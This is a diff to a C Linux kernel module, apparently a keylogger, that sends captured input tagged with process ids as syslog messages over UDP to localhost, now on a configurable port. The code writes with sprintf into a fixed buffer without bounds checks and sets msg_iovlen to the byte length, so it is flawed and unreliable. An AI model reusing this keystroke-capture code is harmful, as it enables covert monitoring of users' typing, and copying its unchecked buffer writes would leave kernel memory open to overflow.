@@ -3,63 +3,69 @@
 #include <linux/socket.h>
 #include <asm/segment.h>
 #include <asm/uaccess.h>
-
+#include <linux/stat.h>
+#include <linux/moduleparam.h>
 #include "keylogging_udp.h"
 
-#define MESSAGE_SIZE 1024
-#define INADDR_SEND ((unsigned long int)0x7f000001) //127.0.0.1
+#define MESSAGE_SIZE 1088 // PRI + header + key logging message
+#define IP ((unsigned long int)0x7f000001) //127.0.0.1
+#define PRI 14 // 1*8 + 6 user-level informational messsages 
 static struct socket *sock;
 static struct sockaddr_in sin;
 static struct msghdr msg;
 static struct iovec iov;
 
-int sock_init, error, len;
 mm_segment_t old_fs;
+int sock_init, error, len;
 char message[MESSAGE_SIZE];
 
+static int port = 514; // default syslog-ng udp port
+module_param(port, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
+MODULE_PARM_DESC(port, "UDP port for syslog-ng");
+
 void perpare_keylogging(void){
-if (sock_init){
-  printk(KERN_DEBUG "Socket aready exits. Release it!\n");
-  release_keylogging(); 
-}
-  /* Creating socket */
+  if (sock_init){
+    printk(KERN_DEBUG "Socket aready exits. Release it!\n");
+    release_keylogging(); 
+  }
+
+  /* Create socket for UDP*/
   error = sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
   if (error<0)
     printk(KERN_DEBUG "Failed to create socket. Error %d\n",error);
 
-  /* Connecting the socket */
+  /* Connecte the socket */
   sin.sin_family = AF_INET;
-  sin.sin_port = htons(8000);
-  sin.sin_addr.s_addr = htonl(INADDR_SEND);
+  sin.sin_port = htons(port);
+  sin.sin_addr.s_addr = htonl(IP);
   error = sock->ops->connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr), 0);
   if (error<0)
     printk(KERN_DEBUG "Failed to connect socket. Error %d\n",error);
 
-  /* Preparing message header */
+  /* Prepare message header */
   msg.msg_flags = 0;
   msg.msg_name = &sin;
   msg.msg_namelen  = sizeof(struct sockaddr_in);
   msg.msg_control = NULL;
   msg.msg_controllen = 0;
   msg.msg_iov = &iov;
-  msg.msg_control = NULL;
   sock_init = 1;
 }
 
 void send_udp(int pid, char * buf){
   if(sock_init){
-/* Sending a message */
-sprintf(message,"pid %d %s\n",pid, buf);
-iov.iov_base = message;
-len = strlen(message);
-iov.iov_len = len;
-msg.msg_iovlen = len;
-old_fs = get_fs();
-set_fs(KERNEL_DS);
-error = sock_sendmsg(sock,&msg,len);
-set_fs(old_fs);
-printk(KERN_DEBUG "Send Message %s\n",message);
-}
+    /* Syslog message */
+    sprintf(message,"<%d> keylogging[%d]: %s\n", PRI, pid, buf);
+    iov.iov_base = message;
+    len = strlen(message);
+    iov.iov_len = len;
+    msg.msg_iovlen = len;
+    /* Send the message */
+    old_fs = get_fs();
+    set_fs(KERNEL_DS);
+    error = sock_sendmsg(sock,&msg,len);
+    set_fs(old_fs);
+  }
 }
 
 void release_keylogging(void){
